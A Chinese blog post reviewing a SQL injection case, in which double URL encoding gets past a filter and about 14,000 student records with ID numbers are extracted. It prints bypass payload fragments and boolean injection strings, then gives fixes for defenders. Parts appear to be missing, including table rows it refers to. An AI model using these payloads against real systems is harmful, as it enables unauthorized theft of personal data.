SQL注入复盘：双URL编码绕过全局过滤器拖取1.4万条新生信息

发表于 2026-08-14 分类于 实战复盘 本文字数： 4.2k 阅读时长 ≈ 4 分钟

0x00 前言

这个注入点所在的系统，防护措施看起来是齐的：全局 SQL 注入过滤器拦单引号，DAO 层拦注释符和分号，怎么看都不像能注的样子。最终它被打穿，靠的不是什么高级手法，而是错误页泄露的几行 JSP 源码——源码里一次多余的 URLDecoder.decode()，让过滤器做的所有检查全部失效。

本文复盘这个漏洞的完整挖掘过程：从探测被拦的死路，到从报错堆里反推出防御架构，再到双编码绕过、运算符优先级构造，最终未授权拖取 1.4 万条新生个人信息（含完整身份证号）。重点记录每一步的判断依据，而非单纯的复现。

过滤器检查的是”原始输入”，而真正进入 SQL 的是”被多解了一次码的输入”。只要把整个 payload 做两次 URL 编码：单引号写成 %2527，过滤器看到的是无害的 %2527，进入 SQL 前才被还原成 '。防护从原理上失效。

经验总结：报错页和堆栈信息在黑盒测试里相当于一部分源码审计能力。很多系统的防御不是不够强，而是层与层之间的顺序出了问题——过滤器只校验原始输入、业务层再解码/再拼接，这类”接缝缺陷”只能靠理解处理链条来发现， fuzz 是 fuzz 不出来的。

但还有最后一道防线。继续测绘：

探测 响应 结论
注入语句含 -- 或 ; 500 空指针，语句未执行 DAO 层有守卫，拦截注释符和分号
注入语句含 /* 不闭合 500 “缺少注释的结尾标记” /* 能过守卫，但需要闭合；而闭合用的 */ 放在 sfz 里又被特殊字符校验拦截

第三行是最后一个坎：不用注释符的话，尾部的身份证后六位条件始终参与运算，or '1'='1' 并不能让全表返回。

对照组：同样双编码的 xyz' or 1=2 or 1='（恒假），返回 {"flag":false,"msg":"未找到指定记录"}。两次请求仅 1=1/1=2 一字之差，响应从”未找到”变为全表数据，布尔差异明确，注入成立无疑。

0x06 总结与防御建议

回顾整条链，这个系统其实有三层防护：全局过滤器拦单引号、DAO 层拦注释符、sfz 参数的特殊字符校验。每一层单独看都在工作，但层与层的接缝处全是缺口——过滤器之后业务代码多解了一次码，DAO 守卫只认注释符不认运算符优先级。防护栈的弱点很少在某一层内部，而通常在层与层的衔接处。

几点测试方法论上的收获：

  1. 报错信息要主动利用。本次的两个转折点（泄露 JSP 源码、泄露完整 SQL）都来自 500 错误页。探测时有意构造异常输入（%、缺参数、类型错误）触发报错，往往比正面 fuzz 更快摸清防御架构。
  2. 绕过思路来自处理链条，不来自 payload 字典。双编码能成立，是因为先确认了”过滤器先查、业务层后解码”这个顺序。不理解链条就盲目套编码绕过字典，大概率无功而返。
  3. 恒真/恒假对照要做完。拖出数据固然是实锤，但恒假对照组是排除”接口本来就返全量”这类误判的必要动作，尤其面对不熟悉的业务接口。

给防守方的修复建议：

  1. 所有 SQL 改用参数化查询（PreparedStatement），严禁字符串拼接，这是根治手段；
  2. 删除业务代码中多余的二次 URLDecoder.decode()；如确需解码，解码后必须重新校验；
  3. 不要依赖关键字黑名单作为防线（无论过滤器还是 DAO 守卫），本次两道黑名单均被绕过；
  4. 生产环境关闭详细错误回显——当前错误页泄露完整堆栈、SQL 语句和 JSP 源码行号，是本次攻击的关键情报来源；
  5. 查询接口增加频次与返回条数限制，敏感字段（身份证号）返回时脱敏。

测试全程仅使用 GET 查询，未修改、写入、删除任何数据；响应样本已脱敏，未保存传播完整数据。文中目标信息已做匿名化处理。
